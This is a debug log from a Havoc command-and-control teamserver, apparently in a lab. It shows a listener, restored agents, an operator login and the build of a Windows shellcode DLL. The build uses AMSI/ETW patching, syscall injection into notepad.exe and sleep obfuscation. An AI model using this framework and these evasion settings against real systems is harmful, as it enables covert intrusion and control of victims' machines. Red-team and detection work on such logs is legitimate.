              _______           _______  _______ 
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │      
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │      
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │      
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\
    │/     \││/     \│   \_/   (_______)(_______/

  	 pwn and elevate until it's done

[11:24:06] [DBUG] [cmd.init.func2:59]: Debug mode enabled
[11:24:06] [INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
[11:24:06] [INFO] Havoc profile: ./profiles/havoc.yaotl
[11:24:06] [INFO] Build: 
 - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc
 - Compiler x86 : data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc
 - Nasm         : /usr/bin/nasm
[11:24:06] [INFO] Time: 13/07/2024 11:24:06
[11:24:06] [INFO] Teamserver logs saved under: data/loot/2024.07.13._11:24:06
[11:24:06] [DBUG] [server.(*Teamserver).Start:53]: Starting teamserver...
[11:24:06] [INFO] Starting Teamserver on wss://0.0.0.0:40056
[11:24:06] [INFO] [SERVICE] starting service handle on wss://0.0.0.0:40056/service-endpoint
[11:24:06] [INFO] Opens existing database: data/teamserver.db
[11:24:06] [DBUG] [certs.HTTPSGenerateRSACertificate:301]: Generating TLS certificate (RSA) for '0.0.0.0' ...
[11:24:06] [INFO] Starting 1 listeners from last session
[11:24:06] [DBUG] [handlers.(*HTTP).Start:204]: Setup HTTP/s Server
[11:24:06] [INFO] Started "1" listener: http://192.168.17.137:80
[11:24:06] [INFO] Restored 6 agents from last session
[11:24:06] [DBUG] [server.(*Teamserver).Start:492]: Wait til the server shutdown
[11:24:06] [DBUG] [certs.generateCertificate:223]: Valid from 2024-05-01 11:24:06.961765757 -0400 EDT to 2027-05-01 11:24:06.961765757 -0400 EDT
[11:24:06] [DBUG] [certs.generateCertificate:228]: Serial Number: 89033264949947162353158063015403105393
[11:24:06] [DBUG] [certs.generateCertificate:234]: Authority certificate
[11:24:06] [DBUG] [certs.generateCertificate:247]: ExtKeyUsage = [1 2]
[11:24:06] [DBUG] [certs.generateCertificate:263]: Certificate authenticates IP address: 0.0.0.0
[11:24:06] [DBUG] [certs.generateCertificate:278]: Certificate is an AUTHORITY
[11:24:11] [DBUG] [server.(*Teamserver).ClientAuthenticate:658]: Found User: 5pider
[11:24:11] [DBUG] [server.(*Teamserver).ClientAuthenticate:665]: User 5pider is authenticated
[11:24:11] [GOOD] User <5pider> Authenticated
[11:24:17] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
[11:24:17] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Shellcode
[11:24:17] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlCreateTimer Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:WaitForSingleObjectEx Stack Duplication:false]
[11:24:17] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
[11:24:17] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
[11:24:17] [DBUG] [builder.(*Builder).PatchConfig:971]: 
[11:24:17] [DBUG] [builder.(*Builder).PatchConfig:982]: 
[11:24:17] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/73ef33c730/3741598e38.o
[11:24:17] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/73ef33c730/1f60ca33f8.o
[11:24:17] [DBUG] [builder.(*Builder).Build:389]: Compile dll and prepend shellcode to it.
[11:24:17] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
[11:24:17] [DBUG] [builder.(*Builder).SetPatchConfig:465]: Set Patch config from Profile
[11:24:17] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlCreateTimer Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:WaitForSingleObjectEx Stack Duplication:false]
[11:24:17] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
[11:24:17] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
[11:24:17] [DBUG] [builder.(*Builder).PatchConfig:971]: 
[11:24:17] [DBUG] [builder.(*Builder).PatchConfig:982]: 
[11:24:17] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/f3b5d11cb8/257c62732b.o
[11:24:17] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/f3b5d11cb8/dc4943d31f.o
[11:24:17] [DBUG] [builder.(*Builder).Build:379]: Compile dll
[11:24:20] [DBUG] [handlers.handleDemonAgent:84]: Agent: 255aa4a, Command: DEMON_INIT
[11:24:20] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
[11:24:20] [DBUG] [handlers.handleDemonAgent:95]: reconnected d8dcf621
[11:25:13] [DBUG] [builder.(*Builder).Build:410]: Successful compiled Dll
[11:27:52] [WARN] User <5pider> Disconnected
